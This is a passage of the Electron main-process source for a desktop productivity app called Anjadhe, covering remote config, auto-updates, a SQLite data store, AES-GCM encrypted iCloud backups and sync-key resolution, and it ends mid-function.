/**
 * Anjadhe - Electron Main Process
 */

const { app, BrowserWindow, Menu, ipcMain, dialog, systemPreferences, powerMonitor, powerSaveBlocker, safeStorage, Notification, ShareMenu, utilityProcess, protocol } = require('electron');
const path = require('path');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const http = require('http');
const https = require('https');
const Store = require('electron-store');
const Database = require('better-sqlite3');
// Load env vars from two sources, in order of precedence (first wins; dotenv
// does NOT override already-set vars):
//   1. .env at process.cwd() — dev-only convenience. NOT bundled. Holds
//      build-time secrets (Apple notarization keys, GH_TOKEN) plus optionally
//      Gmail creds for `npm start`.
//   2. .env.production next to main.js — BUNDLED into the packaged app.
//      Holds only runtime credentials the shipped app needs (Gmail client
//      id/secret). dotenv.config with an explicit path reads transparently
//      from inside app.asar in packaged mode.
require('dotenv').config();
require('dotenv').config({ path: path.join(__dirname, '.env.production') });
const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');
const OllamaManager = require('./ollama/ollama-manager');
const LlamaCppManager = require('./llamacpp/llamacpp-manager');
const { autoUpdater } = require('electron-updater');
const TrackerBlocklist = require('./js/privacy/tracker-blocklist');
const { stripTrackingParams } = require('./js/privacy/tracking-params');
const NetworkLogger = require('./js/core/network-logger');

// Patch http/https before anything makes a network call so every outbound
// request — app code, bundled libraries, and the auto-updater alike — is
// observable from Settings → Network Logs.
NetworkLogger.install();

// Custom scheme that serves Maker artifacts (self-contained HTML/JS/CSS the
// build agent writes to ~/Anjadhe/artifacts/<id>/) into a sandboxed <webview>.
// MUST be registered before app `ready`. A privileged standard+secure scheme
// gives each artifact a stable origin (anjadhe-artifact://<id>) so multi-page
// relative links and localStorage scope per artifact, and lets the handler
// clamp every request inside the artifact folder — unlike file://, which a
// generated page could walk out of via ../ relative links. corsEnabled stays
// off so artifacts can't reach the network; they must be self-contained.
protocol.registerSchemesAsPrivileged([{
    scheme: 'anjadhe-artifact',
    privileges: { standard: true, secure: true, supportFetchAPI: true, corsEnabled: false }
}, {
    // Sandboxed user apps (SECURITY H3) are served from their own origin so the
    // guest document uses its OWN (permissive) CSP instead of inheriting the
    // main window's strict script-src — an about:srcdoc frame would inherit it
    // and block the guest's inline scripts. standard+secure = a real origin +
    // secure context; the frame is additionally sandboxed (opaque origin) so it
    // still can't reach the host or its bridges.
    scheme: 'anjadhe-userapp',
    privileges: { standard: true, secure: true, supportFetchAPI: false, corsEnabled: false }
}]);

// ── Isolated data root (blank-slate testing) ──
// When ANJADHE_DATA_ROOT is set, every writable location the app owns —
// Electron userData (settings + SQLite DB), the iCloud sync journal, iCloud
// backups, and the remote-config cache — is redirected under that one folder.
// This lets you run a genuine blank-slate session (first-run wizard, fresh
// migration, empty sync) without touching, reading, or polluting your real
// data: the process is never even given the paths to your real state, so it
// cannot read or write them. Unset (the default, and every packaged build) →
// all paths resolve to their normal home-directory locations exactly as
// before, so this is purely additive. The setPath MUST run before any store
// opens a file (settingsStore/dataStore are created lower in this module, at
// require time), which it does. Ollama models (~/.ollama) are a shared system
// daemon and intentionally NOT redirected.
const DATA_ROOT = process.env.ANJADHE_DATA_ROOT
    ? path.resolve(process.env.ANJADHE_DATA_ROOT)
    : null;
if (DATA_ROOT) {
    fs.mkdirSync(DATA_ROOT, { recursive: true });
    app.setPath('userData', path.join(DATA_ROOT, 'userData'));
}

// ── Remote Config ──
// Fetches a JSON config from GitHub on startup. Provides model recommendations,
// feature flags, version info, and announcements without requiring an app update.
const REMOTE_CONFIG_URL = 'https://raw.githubusercontent.com/ram-bakthavachalam-754/Anjadhe/main/remote-config.json';
const REMOTE_CONFIG_CACHE_FILE = DATA_ROOT
    ? path.join(DATA_ROOT, 'remote-config-cache.json')
    : path.join(os.homedir(), '.anjadhe_sync', 'remote-config-cache.json');

const RemoteConfig = {
    _config: null,
    _machineInfo: null,
    _lastFetchedAt: 0,
    _ttl: 5 * 60 * 1000, // re-fetch at most every 5 minutes

    /** Fetch config from GitHub, fall back to disk cache, then bundled file */
    async load() {
        // Skip if recently fetched
        if (this._config && (Date.now() - this._lastFetchedAt) < this._ttl) return;
        // Gather machine info once
        this._machineInfo = {
            totalMemGB: Math.round(os.totalmem() / 1024 / 1024 / 1024),
            cpus: os.cpus().length,
            arch: os.arch(),
            platform: os.platform()
        };

        // Try remote first
        try {
            const json = await this._fetch(REMOTE_CONFIG_URL);
            this._config = JSON.parse(json);
            // Cache to disk for offline use
            try { fs.writeFileSync(REMOTE_CONFIG_CACHE_FILE, json, 'utf8'); } catch {}
            this._lastFetchedAt = Date.now();
            console.log('[remote-config] Loaded from remote');
            return;
        } catch (e) {
            console.warn('[remote-config] Remote fetch failed:', e.message);
        }

        // Try disk cache
        try {
            const cached = fs.readFileSync(REMOTE_CONFIG_CACHE_FILE, 'utf8');
            this._config = JSON.parse(cached);
            console.log('[remote-config] Loaded from cache');
            return;
        } catch {}

        // Fall back to bundled file
        try {
            const bundled = fs.readFileSync(path.join(__dirname, 'remote-config.json'), 'utf8');
            this._config = JSON.parse(bundled);
            console.log('[remote-config] Loaded from bundled file');
        } catch {
            this._config = { models: [], announcements: [] };
            console.warn('[remote-config] No config available');
        }
    },

    /** Get the full config with machine info attached */
    get() {
        return {
            ...(this._config || {}),
            machine: this._machineInfo
        };
    },

    /** HTTPS GET with timeout */
    _fetch(url) {
        return new Promise((resolve, reject) => {
            const req = https.get(url, { timeout: 8000 }, (res) => {
                if (res.statusCode !== 200) {
                    res.resume();
                    return reject(new Error(`HTTP ${res.statusCode}`));
                }
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => resolve(data));
            });
            req.on('error', reject);
            req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
        });
    }
};

// ── Updater ──
// Checks GitHub releases (the public Anjadhe repo) for a newer version via
// electron-updater's latest-mac.yml metadata, downloads the signed DMG
// in the background, and pushes renderer events so the titlebar pill
// can nudge the user to install. Guarded by app.isPackaged so dev builds
// (`npm start`) never touch the network. Errors are swallowed — if GitHub
// is unreachable or the metadata is missing, the app simply doesn't nudge.
//
// allowPrerelease = true is critical during the alpha phase: GitHub
// releases tagged as `prerelease: true` are otherwise invisible to the
// updater's default stable channel.
const UpdaterManager = {
    _wired: false,
    // Interval between background re-checks. Anjadhe is left open for days,
    // so a launch-only check would miss releases published mid-session.
    _RECHECK_MS: 4 * 60 * 60 * 1000, // 4 hours
    _timer: null,
    // Latest known state, so windows opened *after* a download completes can
    // hydrate the pill instead of missing the one-shot broadcast.
    _downloadedVersion: null,

    start() {
        if (!app.isPackaged) {
            console.log('[updater] dev build, skipping');
            return;
        }

        if (!this._wired) {
            autoUpdater.allowPrerelease = true;
            autoUpdater.autoDownload = true;
            autoUpdater.autoInstallOnAppQuit = true;

            autoUpdater.on('update-available', (info) => {
                console.log('[updater] update available:', info?.version);
                broadcastToAllWindows('updater:available', { version: info?.version });
            });
            autoUpdater.on('download-progress', (p) => {
                broadcastToAllWindows('updater:progress', {
                    percent: Math.round(p?.percent || 0),
                    transferred: p?.transferred,
                    total: p?.total
                });
            });
            autoUpdater.on('update-downloaded', (info) => {
                console.log('[updater] update downloaded:', info?.version);
                this._downloadedVersion = info?.version || null;
                broadcastToAllWindows('updater:downloaded', { version: info?.version });
            });
            autoUpdater.on('update-not-available', () => {
                console.log('[updater] no update available');
            });
            autoUpdater.on('error', (err) => {
                console.warn('[updater] error:', err?.message || err);
            });

            // Re-check periodically for the whole life of the process. Cheap
            // (one metadata fetch); once a download lands autoInstallOnAppQuit
            // + the pill take over, so repeat checks are harmless no-ops.
            this._timer = setInterval(() => {
                autoUpdater.checkForUpdates().catch((e) => {
                    console.warn('[updater] periodic check failed:', e?.message || e);
                });
            }, this._RECHECK_MS);

            this._wired = true;
        }

        autoUpdater.checkForUpdates().catch((e) => {
            console.warn('[updater] checkForUpdates failed:', e?.message || e);
        });
    },

    // Snapshot for a freshly-opened window to rehydrate its pill.
    state() {
        return { downloadedVersion: this._downloadedVersion };
    },

    async check() {
        if (!app.isPackaged) return { error: 'dev build — updater disabled' };
        try {
            const result = await autoUpdater.checkForUpdates();
            return { success: true, updateInfo: result?.updateInfo || null };
        } catch (e) {
            return { error: e?.message || String(e) };
        }
    },

    install() {
        if (!app.isPackaged) return;
        autoUpdater.quitAndInstall();
    }
};

// Renderer-triggered: open a new window, optionally routed at a sub-app.
// Whitelist app names to avoid arbitrary-hash injection from the renderer.
const ALLOWED_WINDOW_APPS = new Set([
    'notes', 'agent', 'schedule', 'goals', 'focus', 'journal',
    'email', 'bookmarks', 'portfolio',
    'settings', 'about', 'help'
]);
ipcMain.handle('window-open-new', (event, appName) => {
    const hash = typeof appName === 'string' && ALLOWED_WINDOW_APPS.has(appName)
        ? '#' + appName
        : '';
    createWindow(hash);
    return { success: true };
});

// Renderer-triggered manual check (wired to the "Check for Updates…" menu
// item and available via window.electronUpdater.check() for any future UI).
ipcMain.handle('updater-check', async () => {
    return UpdaterManager.check();
});

// Renderer-triggered restart-and-install once the download is ready.
ipcMain.handle('updater-install', () => {
    UpdaterManager.install();
    return { success: true };
});

// Lets a window opened after a download completed rehydrate its update pill,
// since `updater:downloaded` is a one-shot broadcast it would have missed.
ipcMain.handle('updater-state', () => {
    return UpdaterManager.state();
});

// macOS-only: show the native share sheet (NSSharingServicePicker) anchored
// to the current window. Lets the user send a file to Messages, Mail,
// AirDrop, Notes, Reminders, etc. ShareMenu is only exported
// by Electron on darwin — no-op on other platforms.
ipcMain.handle('share-menu-show', (event, sharingItem = {}) => {
    if (process.platform !== 'darwin' || typeof ShareMenu === 'undefined') {
        return { success: false, error: 'Share menu is only available on macOS' };
    }
    const win = BrowserWindow.fromWebContents(event.sender);
    if (!win) return { success: false, error: 'No window to anchor share sheet' };
    try {
        const item = {};
        if (Array.isArray(sharingItem.texts) && sharingItem.texts.length) item.texts = sharingItem.texts;
        if (Array.isArray(sharingItem.urls) && sharingItem.urls.length) item.urls = sharingItem.urls;
        if (Array.isArray(sharingItem.filePaths) && sharingItem.filePaths.length) item.filePaths = sharingItem.filePaths;
        if (!Object.keys(item).length) return { success: false, error: 'Nothing to share' };
        new ShareMenu(item).popup({ window: win });
        return { success: true };
    } catch (e) {
        return { success: false, error: e.message || String(e) };
    }
});

// Set app name (for macOS menu bar in dev mode)
if (process.platform === 'darwin') {
    app.setName('Anjadhe');
}

let mainWindow;

// Send an IPC message to every open window. Used for app-wide signals
// (sync results, lock, power state, updater events) so additional windows
// opened via File → New Window stay in sync with the primary.
function broadcastToAllWindows(channel, ...args) {
    for (const win of BrowserWindow.getAllWindows()) {
        if (!win.isDestroyed()) win.webContents.send(channel, ...args);
    }
}

// Prefer the window the user is currently interacting with; fall back to
// mainWindow and then any open window. Used for dialog parents and for
// routing menu actions that only make sense in one window at a time.
function getActiveWindow() {
    return BrowserWindow.getFocusedWindow()
        || (mainWindow && !mainWindow.isDestroyed() ? mainWindow : null)
        || BrowserWindow.getAllWindows()[0]
        || null;
}

// Settings store - always in default location to remember custom path
const settingsStore = new Store({
    name: 'anjadhe-app-settings',
    defaults: {
        customStoragePath: null,
        setupComplete: false
    }
});

// MCP client (docs/COWORK_AGENT.md C2) — config in the machine-local
// settingsStore; server processes live and die in this process.
const MCPManager = require('./js/main/mcp-manager');
MCPManager.init(settingsStore);

// --- SQLite Data Store ---

let dataDb = null;

function getDbPath(customPath) {
    const dir = customPath || app.getPath('userData');
    return path.join(dir, 'anjadhe-app-data.db');
}

function getLegacyJsonPath(customPath) {
    const dir = customPath || app.getPath('userData');
    return path.join(dir, 'anjadhe-app-data.json');
}

function createDatabase(dbPath) {
    const dir = path.dirname(dbPath);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    const db = new Database(dbPath);
    db.pragma('journal_mode = WAL');
    db.exec('CREATE TABLE IF NOT EXISTS kv (key TEXT PRIMARY KEY, value TEXT)');
    // emails table — per-message rows so the email cache doesn't live inside
    // the kv blob. Denormalized columns are what the list view filters/sorts
    // by; the full JSON record lives in `data` so schema evolution stays cheap.
    db.exec(`
        CREATE TABLE IF NOT EXISTS emails (
            messageId TEXT PRIMARY KEY,
            account TEXT NOT NULL,
            internalDate INTEGER DEFAULT 0,
            isRead INTEGER DEFAULT 0,
            isStarred INTEGER DEFAULT 0,
            labels TEXT DEFAULT '[]',
            data TEXT NOT NULL
        );
        CREATE INDEX IF NOT EXISTS idx_emails_account_date ON emails(account, internalDate DESC);
        CREATE INDEX IF NOT EXISTS idx_emails_date ON emails(internalDate DESC);
        -- Heavy message bodies live in their own table so the list/insights load
        -- path (emails.data) stays a small header. Bodies are fetched on demand
        -- when a message is opened, replied to, or analyzed.
        CREATE TABLE IF NOT EXISTS email_bodies (
            messageId TEXT PRIMARY KEY,
            bodyText TEXT,
            bodyHtml TEXT
        );
    `);
    migrateEmailBodies(db);
    return db;
}

// One-time migration: emails used to store bodyText/bodyHtml inside emails.data.
// Move any inline bodies into email_bodies and rewrite the header without them,
// so every subsequent list load is header-only. Guarded by a kv flag so it runs
// exactly once per database.
function migrateEmailBodies(db) {
    try {
        const flag = db.prepare("SELECT value FROM kv WHERE key = 'emailBodiesSplit'").get();
        if (flag?.value === 'true') return;
        const rows = db.prepare('SELECT messageId, data FROM emails').all();
        const insertBody = db.prepare(
            `INSERT INTO email_bodies (messageId, bodyText, bodyHtml)
             VALUES (@messageId, @bodyText, @bodyHtml)
             ON CONFLICT(messageId) DO UPDATE SET
                bodyText = excluded.bodyText, bodyHtml = excluded.bodyHtml`
        );
        const updateHeader = db.prepare('UPDATE emails SET data = ? WHERE messageId = ?');
        const txn = db.transaction(() => {
            let moved = 0;
            for (const row of rows) {
                let email;
                try { email = JSON.parse(row.data); } catch { continue; }
                if (email == null || typeof email !== 'object') continue;
                if (email.bodyText == null && email.bodyHtml == null) continue;
                insertBody.run({
                    messageId: row.messageId,
                    bodyText: email.bodyText ?? null,
                    bodyHtml: email.bodyHtml ?? null
                });
                delete email.bodyText;
                delete email.bodyHtml;
                updateHeader.run(JSON.stringify(email), row.messageId);
                moved++;
            }
            db.prepare("INSERT INTO kv (key, value) VALUES ('emailBodiesSplit', 'true') ON CONFLICT(key) DO UPDATE SET value = 'true'").run();
            if (moved) console.log(`[email] Split ${moved} message bodies into email_bodies`);
        });
        txn();
    } catch (e) {
        console.warn('[email] body-split migration failed:', e?.message);
    }
}

function openSqliteStore() {
    const customPath = settingsStore.get('customStoragePath');
    const dbPath = getDbPath(customPath);
    return createDatabase(dbPath);
}

// One-time migration from the legacy JSON file (anjadhe-app-data.json) into
// SQLite. Triggered when the kv table is empty *and* a legacy JSON file is
// sitting next to the new .db. After a successful copy the JSON is renamed
// to .json.bak so subsequent launches don't re-run the migration but the
// user can still recover the original if anything goes sideways.
function migrateLegacyJsonIfNeeded(db, customPath) {
    const legacyPath = getLegacyJsonPath(customPath);
    if (!fs.existsSync(legacyPath)) return;

    const kvCount = db.prepare('SELECT COUNT(*) AS n FROM kv').get().n;
    if (kvCount > 0) return;

    try {
        const allData = JSON.parse(fs.readFileSync(legacyPath, 'utf8'));
        const entries = Object.entries(allData || {});
        if (entries.length === 0) {
            fs.renameSync(legacyPath, legacyPath + '.bak');
            return;
        }
        const insert = db.prepare('INSERT OR REPLACE INTO kv (key, value) VALUES (?, ?)');
        const tx = db.transaction((items) => {
            for (const [key, value] of items) insert.run(key, JSON.stringify(value));
        });
        tx(entries);
        fs.renameSync(legacyPath, legacyPath + '.bak');
        console.log(`[storage] Migrated ${entries.length} keys from legacy JSON to SQLite`);
    } catch (err) {
        console.error('[storage] Legacy JSON migration failed:', err);
    }
}

dataDb = openSqliteStore();
migrateLegacyJsonIfNeeded(dataDb, settingsStore.get('customStoragePath'));

// Unified store interface
const dataStore = {
    get(key) {
        const row = dataDb.prepare('SELECT value FROM kv WHERE key = ?').get(key);
        return row ? JSON.parse(row.value) : undefined;
    },
    set(key, value) {
        dataDb.prepare('INSERT OR REPLACE INTO kv (key, value) VALUES (?, ?)').run(key, JSON.stringify(value));
    },
    delete(key) {
        dataDb.prepare('DELETE FROM kv WHERE key = ?').run(key);
    },
    clear() {
        dataDb.exec('DELETE FROM kv');
    },
    getAll() {
        const rows = dataDb.prepare('SELECT key, value FROM kv').all();
        const result = {};
        for (const row of rows) {
            result[row.key] = JSON.parse(row.value);
        }
        return result;
    },
    has(key) {
        const row = dataDb.prepare('SELECT 1 FROM kv WHERE key = ?').get(key);
        return !!row;
    },
    // Key listing without deserializing values — getAll() JSON-parses every
    // blob in the store, which is far too heavy for "which keys exist".
    keysWithPrefix(prefix) {
        const escaped = String(prefix).replace(/[%_\\]/g, '\\$&');
        return dataDb.prepare("SELECT key FROM kv WHERE key LIKE ? ESCAPE '\\'")
            .all(escaped + '%').map(r => r.key);
    },
    getPath() {
        return dataDb.name;
    }
};

// Let the network logger load prior entries and persist new ones now that
// the kv store is open.
NetworkLogger.attachStore(dataStore);

// --- iCloud Backup System ---

const ICLOUD_BACKUP_DIR = DATA_ROOT
    ? path.join(DATA_ROOT, 'backup')
    : path.join(
        app.getPath('home'),
        'Library/Mobile Documents/com~apple~CloudDocs/.anjadhe_backup'
    );

let backupTimer = null;

function getBackupSettings() {
    return {
        enabled: settingsStore.get('backupEnabled', false),
        frequency: settingsStore.get('backupFrequency', 'hourly'), // 'hourly', 'daily', 'weekly'
        lastBackup: settingsStore.get('lastBackupTime', null),
        backupPath: ICLOUD_BACKUP_DIR
    };
}

// Migrate backups from old visible folder to new hidden folder
function migrateOldBackups() {
    const oldDir = path.join(app.getPath('home'), 'Library/Mobile Documents/com~apple~CloudDocs/anjadhe_app_backup');
    try {
        if (!fs.existsSync(oldDir)) return;
        const files = fs.readdirSync(oldDir);
        if (files.length === 0) {
            fs.rmdirSync(oldDir);
            return;
        }
        if (!fs.existsSync(ICLOUD_BACKUP_DIR)) {
            fs.mkdirSync(ICLOUD_BACKUP_DIR, { recursive: true });
        }
        for (const file of files) {
            const src = path.join(oldDir, file);
            const dest = path.join(ICLOUD_BACKUP_DIR, file);
            fs.renameSync(src, dest);
        }
        fs.rmdirSync(oldDir);
        console.log('Migrated backups from old location to new hidden folder');
    } catch (err) {
        console.error('Backup migration failed:', err);
    }
}

migrateOldBackups();

const MAX_AUTO_BACKUPS = 7;
const MAX_MANUAL_BACKUPS = 10;

// Encrypt a file in-place using AES-256-GCM (uses sync encryption key)
function encryptFile(filePath) {
    // Fail closed (H6): with no key (sync locked, or resolution failed) we must
    // NOT leave a backup on disk unencrypted. Callers run inside try/catch.
    if (!syncEncryptionKey) throw new Error('sync key unavailable — cannot encrypt backup');
    const plaintext = fs.readFileSync(filePath);
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', syncEncryptionKey, iv);
    const encrypted = Buffer.concat([cipher.update(plaintext), cipher.final()]);
    const authTag = cipher.getAuthTag();
    // Format: 12-byte IV + 16-byte authTag + ciphertext
    fs.writeFileSync(filePath, Buffer.concat([iv, authTag, encrypted]));
}

// Plaintext files — unencrypted backups and bare-JSON journal entries —
// predate sync encryption. We still read them during a migration window so
// no genuine old data is lost, but once a key exists an unencrypted file is
// just as likely to be an injected one (backup swap / journal poisoning),
// and past this cutoff we refuse it. Startup migration (migrateJournalFiles)
// re-encrypts this Mac's plaintext journal well before the date, and encrypted
// backups rotate in via retention — so legitimate plaintext is gone by then.
// Generous, alpha-era window; revisit before it lapses. (SECURITY-AUDIT.md M2.)
const PLAINTEXT_COMPAT_UNTIL = Date.parse('2026-11-16T00:00:00Z');

// A genuine (pre-encryption) SQLite backup begins with the SQLite magic
// string; an encrypted file begins with 12 random IV bytes, which never
// matches. Lets us tell "plaintext backup" from "meant-to-be-encrypted".
const SQLITE_MAGIC = Buffer.from('SQLite format 3\0', 'binary');
function looksLikeSqlite(buf) {
    return buf.length >= SQLITE_MAGIC.length && buf.subarray(0, SQLITE_MAGIC.length).equals(SQLITE_MAGIC);
}

// Decrypt a backup file to its plaintext Buffer. Returns null when the file
// cannot be trusted (M2: fail closed) — the caller must refuse to restore it.
function decryptFile(filePath) {
    const data = fs.readFileSync(filePath);
    if (!syncEncryptionKey) return data;   // no key yet — nothing to verify against
    if (looksLikeSqlite(data)) {
        // Unencrypted backup. Genuine ones predate encryption; an attacker
        // with iCloud write access could also drop one to poison a restore.
        if (Date.now() > PLAINTEXT_COMPAT_UNTIL) {
            console.error('[backup] refusing an UNENCRYPTED backup after the compat cutoff (M2)');
            return null;
        }
        console.warn('[backup] reading an UNENCRYPTED backup (pre-encryption compat window) — M2');
        return data;
    }
    // Otherwise it must be our AES-256-GCM envelope: IV(12) + authTag(16) + ct.
    if (data.length < 29) return null;
    const iv = data.subarray(0, 12);
    const authTag = data.subarray(12, 28);
    const ciphertext = data.subarray(28);
    try {
        const decipher = crypto.createDecipheriv('aes-256-gcm', syncEncryptionKey, iv);
        decipher.setAuthTag(authTag);
        return Buffer.concat([decipher.update(ciphertext), decipher.final()]);
    } catch {
        // FAIL CLOSED (M2): an auth-tag failure means the file was tampered
        // with, corrupted, or encrypted under a foreign key. The old code
        // returned the raw bytes here, which fed an attacker-controlled or
        // garbage DB straight into restoreFromBackup. Reject it instead.
        console.error('[backup] auth-tag verification FAILED — refusing this backup (M2)');
        return null;
    }
}

function performBackup(type = 'auto') {
    // Sync locked (H6): the key isn't available to encrypt a backup, and we
    // won't write one in cleartext. Resumes once unlocked.
    if (syncKeyLocked) return { success: false, error: 'Sync is locked — unlock with your passphrase to resume backups.' };
    try {
        // Ensure backup directory exists
        if (!fs.existsSync(ICLOUD_BACKUP_DIR)) {
            fs.mkdirSync(ICLOUD_BACKUP_DIR, { recursive: true });
        }

        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const backupFile = path.join(ICLOUD_BACKUP_DIR, `backup-${type}-${timestamp}.db`);

        dataDb.exec(`VACUUM INTO '${backupFile.replace(/'/g, "''")}'`);

        // Encrypt the backup file
        encryptFile(backupFile);

        // Clean up old backups beyond retention limit
        cleanupOldBackups(type, type === 'auto' ? MAX_AUTO_BACKUPS : MAX_MANUAL_BACKUPS);

        const now = new Date().toISOString();
        settingsStore.set('lastBackupTime', now);
        console.log(`Backup (${type}) completed at ${now}`);
        return { success: true, time: now };
    } catch (error) {
        console.error('Backup failed:', error);
        return { success: false, error: error.message };
    }
}

function cleanupOldBackups(type, maxCount) {
    try {
        const files = fs.readdirSync(ICLOUD_BACKUP_DIR)
            .filter(f => f.startsWith(`backup-${type}-`))
            .sort()
            .reverse(); // newest first

        for (let i = maxCount; i < files.length; i++) {
            fs.unlinkSync(path.join(ICLOUD_BACKUP_DIR, files[i]));
        }
    } catch (err) {
        console.error('Backup cleanup failed:', err);
    }
}

function getBackupIntervalMs(frequency) {
    switch (frequency) {
        case 'hourly': return 60 * 60 * 1000;
        case 'weekly': return 7 * 24 * 60 * 60 * 1000;
        case 'daily':
        default: return 24 * 60 * 60 * 1000;
    }
}

// How often to check whether a backup is due. Must be << the shortest
// real interval (hourly) so wall-clock drift is trivial, and small
// enough that a post-sleep wake catches up quickly.
const BACKUP_POLL_MS = 5 * 60 * 1000;

function runBackupIfDue() {
    const settings = getBackupSettings();
    if (!settings.enabled) return;
    const intervalMs = getBackupIntervalMs(settings.frequency);
    const lastMs = settings.lastBackup ? new Date(settings.lastBackup).getTime() : 0;
    if (Date.now() - lastMs >= intervalMs) performBackup();
}

function startBackupSchedule() {
    stopBackupSchedule();
    if (!getBackupSettings().enabled) return;

    // Decision: poll every BACKUP_POLL_MS and compare wall-clock to
    // lastBackup, instead of setInterval(intervalMs) anchored to app
    // start. The old approach lost all its progress on every restart —
    // if the user relaunched faster than the interval (trivially true
    // for 'daily'), the timer never fired. Polling is restart-proof
    // and also picks up live setting changes without re-arming.
    runBackupIfDue();
    backupTimer = setInterval(runBackupIfDue, BACKUP_POLL_MS);
}

function stopBackupSchedule() {
    if (backupTimer) {
        clearInterval(backupTimer);
        backupTimer = null;
    }
}

function getAvailableBackups() {
    try {
        if (!fs.existsSync(ICLOUD_BACKUP_DIR)) return [];

        const files = fs.readdirSync(ICLOUD_BACKUP_DIR);
        const backups = [];

        for (const file of files) {
            if (file.startsWith('backup-')) {
                const filePath = path.join(ICLOUD_BACKUP_DIR, file);
                const stat = fs.statSync(filePath);
                const type = file.startsWith('backup-manual-') ? 'manual' : 'auto';
                backups.push({
                    name: file,
                    path: filePath,
                    size: stat.size,
                    modified: stat.mtime.toISOString(),
                    type
                });
            }
        }

        return backups.sort((a, b) => new Date(b.modified) - new Date(a.modified));
    } catch (error) {
        return [];
    }
}

function restoreFromBackup(backupPath) {
    try {
        if (!fs.existsSync(backupPath)) {
            return { success: false, error: 'Backup file not found' };
        }

        // Decrypt + verify the backup (M2: decryptFile fails closed).
        const decrypted = decryptFile(backupPath);
        if (decrypted === null) {
            return { success: false, error: 'This backup could not be verified — it may be corrupted, tampered with, or encrypted with a different key. Restore was refused.' };
        }
        const tmpPath = backupPath + '.tmp';
        fs.writeFileSync(tmpPath, decrypted);

        try {
            const currentDbPath = dataDb.name;

            // Verify backup is valid
            const testDb = new Database(tmpPath, { readonly: true });
            const row = testDb.prepare('SELECT COUNT(*) as count FROM kv').get();
            testDb.close();

            if (row.count === 0) {
                return { success: false, error: 'Backup contains no data' };
            }

            // Close current db, replace with backup, reopen
            dataDb.close();
            fs.copyFileSync(tmpPath, currentDbPath);

            // Remove WAL/SHM files to avoid conflicts
            try { fs.unlinkSync(currentDbPath + '-wal'); } catch {}
            try { fs.unlinkSync(currentDbPath + '-shm'); } catch {}

            dataDb = createDatabase(currentDbPath);
            return { success: true, keyCount: row.count };
        } finally {
            try { fs.unlinkSync(tmpPath); } catch {}
        }
    } catch (error) {
        // Try to reopen the database if it was closed
        if (!dataDb || !dataDb.open) {
            try {
                const customPath = settingsStore.get('customStoragePath');
                dataDb = createDatabase(getDbPath(customPath));
            } catch {}
        }
        return { success: false, error: error.message };
    }
}

// --- iCloud Sync Journal System ---
// Each machine writes per-key JSON change files to its own folder in iCloud.
// On startup, newer changes from other machines are merged into the local DB.

const ICLOUD_SYNC_DIR = DATA_ROOT
    ? path.join(DATA_ROOT, 'sync')
    : path.join(
        app.getPath('home'),
        'Library/Mobile Documents/com~apple~CloudDocs/.anjadhe_sync'
    );

function getMachineId() {
    let id = settingsStore.get('machineId');
    if (!id) {
        // Use hostname, sanitized for filesystem safety
        id = os.hostname().replace(/[^a-zA-Z0-9_-]/g, '_');
        settingsStore.set('machineId', id);
    }
    return id;
}

const machineId = getMachineId();
const machineSyncDir = path.join(ICLOUD_SYNC_DIR, machineId);

// --- Sync Encryption (AES-256-GCM) ---
// The 32-byte sync key encrypts the iCloud journal + backups. Files prefixed
// with "ENC:" are encrypted; plain JSON is read as-is for backward compat.
//
// H6 (SECURITY-AUDIT.md): the key must NOT sit in iCloud as plaintext next to
// the ciphertext it protects. Instead it can be passphrase-WRAPPED — iCloud
// then holds only `.sync-key.enc` (scrypt-derived AES-GCM wrap, see
// js/main/sync-key-crypto.js), the passphrase never leaves the device, and
// each Mac unlocks once and caches the raw key in its own Keychain
// (safeStorage). The legacy plaintext `.sync-key` still works untouched — the
// H6 protection is OPT-IN (setSyncPassphrase), so merely upgrading never
// disrupts an existing multi-Mac setup.
const SyncKeyCrypto = require('./js/main/sync-key-crypto');
const SYNC_KEY_FILE = path.join(ICLOUD_SYNC_DIR, '.sync-key');       // legacy plaintext
const SYNC_KEY_ENC_FILE = path.join(ICLOUD_SYNC_DIR, '.sync-key.enc'); // passphrase-wrapped (H6)
const ENC_PREFIX = 'ENC:';
let syncEncryptionKey = null;
// H6 state (surfaced to the renderer via 'sync-encryption-status'):
//   'plaintext'  — legacy unencrypted key in iCloud (works; upgradeable)
//   'passphrase' — wrapped key in iCloud, unlocked on this Mac (protected)
//   'locked'     — wrapped key in iCloud, NOT unlocked here → sync/backup paused
//   'local-only' — a locally-generated key not yet published to iCloud (no cross-Mac sync)
//   'none'       — no key material at all (resolution failed)
let syncKeyState = 'none';
let syncKeyLocked = false;

// Local, per-Mac cache of the raw key so a wrapped key is unlocked only once.
// safeStorage-encrypted (M9: never cache the raw key in cleartext); if the
// keychain is unavailable we simply don't cache and re-prompt next launch.
function cacheSyncKeyLocal(rawKey) {
    try {
        if (!safeStorage.isEncryptionAvailable()) return false;
        settingsStore.set('syncKeyCache', safeStorage.encryptString(rawKey.toString('hex')).toString('base64'));
        return true;
    } catch { return false; }
}
function readCachedSyncKey() {
    try {
        const stored = settingsStore.get('syncKeyCache', null);
        if (!stored || !safeStorage.isEncryptionAvailable()) return null;
        const buf = Buffer.from(safeStorage.decryptString(Buffer.from(stored, 'base64')), 'hex');
        return buf.length === 32 ? buf : null;
    } catch { return null; }
}
function readWrappedSyncKey() {
    try {
        if (!fs.existsSync(SYNC_KEY_ENC_FILE)) return null;
        return JSON.parse(fs.readFileSync(SYNC_KEY_ENC_FILE, 'utf8'));
    } catch { return null; }
}

// Resolve the sync key at startup. Order: wrapped key (cache → else locked) →
// legacy plaintext (untouched, opt-in upgrade) → locally cached → generate a
// new local-only key. A newly generated key is kept LOCAL (never written to
// iCloud as plaintext) — cross-Mac sync waits until the user sets a passphrase.
function resolveSyncKey() {
    try {
        if (!fs.existsSync(ICLOUD_SYNC_DIR)) fs.mkdirSync(ICLOUD_SYNC_DIR, { recursive: true });

        if (readWrappedSyncKey()) {
            const cached = readCachedSyncKey();
            if (cached) { syncKeyState = 'passphrase'; syncKeyLocked = false; return cached; }
            syncKeyState = 'locked'; syncKeyLocked = true; return null;   // needs passphrase
        }

        if (fs.existsSync(SYNC_KEY_FILE)) {
            const keyHex = fs.readFileSync(SYNC_KEY_FILE, 'utf8').trim();
            if (keyHex.length === 64) {
